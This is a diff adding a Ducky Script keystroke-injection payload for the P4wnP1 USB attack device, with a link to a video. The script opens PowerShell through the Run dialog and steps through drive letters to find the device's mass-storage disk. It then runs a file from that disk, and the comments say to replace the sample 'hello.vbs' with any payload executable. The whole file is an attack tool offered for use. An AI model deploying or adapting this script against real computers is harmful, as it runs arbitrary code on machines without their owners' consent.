@@ -1,0 +1,33 @@
+# In setup.cfg, don't forgot : "USE_UMS=true"
+# you can run any payloads with P4wnP1 and this ducky scipt :
+#
+# more information : https://www.youtube.com/watch?v=ULh_Zilfwe8&t=143s
+
+
+
+                GUI r
+                DELAY 200
+                STRING powershell
+                DELAY 200
+                ENTER
+                DELAY 1250
+
+                REM now P4wnP1 brute force the letter assigned to the disk :
+
+                STRING cd e:
+                ENTER
+                STRING cd h:
+                ENTER
+                STRING cd g:
+                ENTER
+                STRING cd f:
+                ENTER
+
+		REM put your payload on the disk of P4wnP1 and replace ".\hello.vbs" by ".\payloadname.exe"
+                STRING .\hello.vbs
+                ENTER
+
+		STRING exit
+		ENTER
+
+
